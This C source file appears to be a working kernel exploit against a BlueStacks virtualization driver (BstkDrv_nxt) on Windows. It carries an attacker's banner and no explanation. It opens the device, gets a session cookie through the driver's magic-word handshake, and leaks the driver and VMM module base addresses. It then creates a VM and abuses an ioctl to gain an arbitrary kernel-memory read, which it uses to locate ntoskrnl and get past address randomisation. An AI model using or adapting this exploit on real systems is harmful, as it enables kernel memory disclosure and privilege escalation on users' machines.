#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "bstk_suptable.h"

#define DEVU  L"\\Device\\BstkDrv_nxt"
#define COOKIE_MAGIC 0x69726f74u
#define DEV_MAGIC    0x64726962u
#define SESS_MAGIC   0x62697264u

#define G_READ_RVA   0x7D780ull
#define NT_GLOBAL    0x5C850ull

typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } USTR;
typedef struct { ULONG Length; HANDLE Root; USTR *Name; ULONG Attr; void *sd,*sqs; } OBJATTR;
typedef struct { PVOID Info; ULONG_PTR St; } IOSB;
typedef LONG (WINAPI *pNtCreateFile)(HANDLE*,ACCESS_MASK,void*,void*,void*,ULONG,ULONG,ULONG,ULONG,void*,ULONG);
typedef LONG (WINAPI *pNtDevIoCtl)(HANDLE,HANDLE,void*,void*,void*,ULONG,void*,ULONG,void*,ULONG);

static HANDLE g_h;
static pNtCreateFile NtCreateFile_;
static pNtDevIoCtl   NtDevIoCtl_;
static uint32_t g_ck, g_sck;
static uint64_t g_pSession, g_drvBase, g_vmmBase, g_ntBase;
static uint64_t g_pGVM, g_pVM, g_pageU, g_pageK, g_readG;

static void banner(void)
{
    printf(" _._     _,-'\"\"`-._\n");
    printf("(,-.`._,'(       |\\`-/|\n");
    printf("    `-.-' \\ )-`( , o o)\n");
    printf("          `-    \\`_`\"'-  SiCk // afflicted.sh\n\n");
}

static int ioctl_(uint32_t code, void *in, uint32_t il, void *out, uint32_t ol)
{
    IOSB io = {0};
    return (int)NtDevIoCtl_(g_h, NULL, NULL, NULL, &io, code, in, il, out, ol);
}

static void hdr(uint8_t *b, uint32_t cbIn, uint32_t cbOut, uint32_t ck, uint32_t sck)
{
    *(uint32_t*)(b+0)=ck; *(uint32_t*)(b+4)=sck; *(uint32_t*)(b+8)=cbIn;
    *(uint32_t*)(b+12)=cbOut; *(uint32_t*)(b+16)=0x42000042u; *(uint32_t*)(b+20)=0;
}

static int open_dev(void)
{
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    NtCreateFile_ = (pNtCreateFile)GetProcAddress(nt,"NtCreateFile");
    NtDevIoCtl_   = (pNtDevIoCtl)GetProcAddress(nt,"NtDeviceIoControlFile");
    if(!NtCreateFile_ || !NtDevIoCtl_) return 0;
    USTR us; us.Buffer=DEVU; us.Length=(USHORT)(wcslen(DEVU)*2); us.MaximumLength=us.Length+2;
    OBJATTR oa={sizeof(oa),NULL,&us,0x40,NULL,NULL}; IOSB io={0};
    return NtCreateFile_(&g_h,GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE,&oa,&io,
                         NULL,0,3,1,0x20,NULL,0)==0;
}

static int cookie(void)
{
    uint8_t b[0x38]; memset(b,0,sizeof b);
    hdr(b,0x30,0x38,COOKIE_MAGIC,0);
    memcpy(b+0x18,"The Magic Word!",15);
    *(uint32_t*)(b+0x28)=0x330004; *(uint32_t*)(b+0x2c)=0x330004;
    if (ioctl_(0x228204,b,0x30,b,0x38)!=0) return 0;
    g_ck=*(uint32_t*)(b+0x18); g_sck=*(uint32_t*)(b+0x1c); g_pSession=*(uint64_t*)(b+0x30);
    return *(int32_t*)(b+0x14)==0;
}

static int leak_drvbase(void)
{
    static uint8_t f[0x4460];
    for (int att=0; att<8; att++) {
        memset(f,0,sizeof f); hdr(f,0x18,0x4460,DEV_MAGIC,SESS_MAGIC);
        if (ioctl_(0x228208,f,0x18,f,0x4460)==0 && *(int32_t*)(f+0x14)==0) break;
        Sleep(40);
    }
    uint32_t cF=*(uint32_t*)(f+0x18);
    uint64_t votes[8]={0}; int nv[8]={0}, best=0;
    for (uint32_t i=0;i<cF && i<312;i++){
        uint64_t pfn=*(uint64_t*)(f+0x20+(size_t)i*56+48);
        if ((pfn>>48)!=0xFFFF || SUP_ONDISK[i]==0) continue;
        uint64_t rva=SUP_ONDISK[i]-0x140000000ull; if (rva>0x100000) continue;
        uint64_t base=pfn-rva; int fnd=-1;
        for(int k=0;k<8;k++) if(votes[k]==base){fnd=k;break;}
        if(fnd<0) for(int k=0;k<8;k++) if(nv[k]==0){votes[k]=base;fnd=k;break;}
        if(fnd>=0){ nv[fnd]++; if(nv[fnd]>nv[best]) best=fnd; }
    }
    g_drvBase=votes[best];
    return g_drvBase!=0;
}

static uint64_t ldr_base(const char *name)
{
    uint8_t b[0x148]; memset(b,0,sizeof b); hdr(b,0x148,0x28,g_ck,g_sck);
    strcpy((char*)(b+0x20),name); strcpy((char*)(b+0x40),"C:\\d");
    if (ioctl_(0x22820c,b,0x148,b,0x28)!=0) return 0;
    if (*(int32_t*)(b+0x14)!=0) return 0;
    return *(uint64_t*)(b+0x18);
}

static int page_alloc(void)
{
    uint8_t b[0x30]; memset(b,0,sizeof b); hdr(b,0x20,0x30,g_ck,g_sck);
    *(uint32_t*)(b+0x18)=1; b[0x1c]=1; b[0x1d]=1;
    if (ioctl_(0x228228,b,0x20,b,0x30)!=0) return 0;
    if (*(int32_t*)(b+0x14)!=0) return 0;
    g_pageU=*(uint64_t*)(b+0x18); g_pageK=*(uint64_t*)(b+0x20);
    return (g_pageK>>48)==0xFFFF;
}

static int create_vm(void)
{
    uint8_t b[0x58]; memset(b,0,sizeof b); hdr(b,0x58,0x58,DEV_MAGIC,SESS_MAGIC);
    *(uint64_t*)(b+0x18)=0;
    *(uint32_t*)(b+0x20)=0xFFFFFFFD;
    *(uint32_t*)(b+0x24)=0x20;
    *(uint32_t*)(b+0x30)=0x19730211;
    *(uint32_t*)(b+0x34)=0x28;
    *(uint64_t*)(b+0x38)=g_pSession;
    *(uint32_t*)(b+0x40)=1;
    if (ioctl_(0x22826C,b,0x58,b,0x58)!=0) return 0;
    if (*(int32_t*)(b+0x14)!=0) return 0;
    g_pVM =*(uint64_t*)(b+0x48);
    g_pGVM=*(uint64_t*)(b+0x50);
    return (g_pGVM>>48)==0xFFFF;
}

static uint32_t op140(uint64_t target, uint64_t arg)
{
    *(uint64_t*)(g_pageU+0x88)=g_pGVM;
    *(uint64_t*)(g_pageU+0xA8)=target;
    *(uint64_t*)(g_pageU+0xC0)=arg;
    uint8_t b[0x50]; memset(b,0,sizeof b); hdr(b,0x50,0x50,DEV_MAGIC,SESS_MAGIC);
    *(uint64_t*)(b+0x18)=g_pGVM;
    *(uint32_t*)(b+0x20)=0xFFFFFFFD;
    *(uint32_t*)(b+0x24)=0x140;
    *(uint32_t*)(b+0x30)=0x19730211;
    *(uint32_t*)(b+0x34)=0x20;
    *(uint64_t*)(b+0x38)=g_pageK;
    ioctl_(0x22826C,b,0x50,b,0x50);
    return *(uint32_t*)(b+0x14);
}

static uint32_t rd32(uint64_t a){ return op140(g_readG, a); }
static uint64_t rd64(uint64_t a){ return (uint64_t)rd32(a) | ((uint64_t)rd32(a+4)<<32); }

int main(void)
{
    banner();

    if(!open_dev())     { printf("[-] dev\n");     return 1; }
    if(!cookie())       { printf("[-] cookie\n");  return 1; }
    if(!leak_drvbase()) { printf("[-] drvbase\n"); return 1; }
    printf("[*] bstkdrv  %016llX\n",(unsigned long long)g_drvBase);

    g_vmmBase = ldr_base("BstkVMMR0_nxt.r0");
    if((g_vmmBase>>48)!=0xFFFF){ printf("[-] vmm\n"); return 1; }
    printf("[*] vmmr0    %016llX\n",(unsigned long long)g_vmmBase);
    g_readG = g_vmmBase + G_READ_RVA;
    printf("[*] rd32      vmm+7D780   %016llX\n",(unsigned long long)g_readG);

    if(!page_alloc()) { printf("[-] page\n");  return 1; }
    if(!create_vm())  { printf("[-] gvm\n");   return 1; }

    if((rd32(g_vmmBase)&0xFFFF)!=0x5A4D){ printf("[-] r32\n"); return 1; }

    g_ntBase = rd64(g_drvBase + NT_GLOBAL);
    if((g_ntBase>>48)!=0xFFFF || (rd32(g_ntBase)&0xFFFF)!=0x5A4D){
        printf("[-] nt %016llX\n",(unsigned long long)g_ntBase);
        return 1;
    }

    printf("[*] ntoskrnl %016llX\n",(unsigned long long)g_ntBase);
    return 0;
}
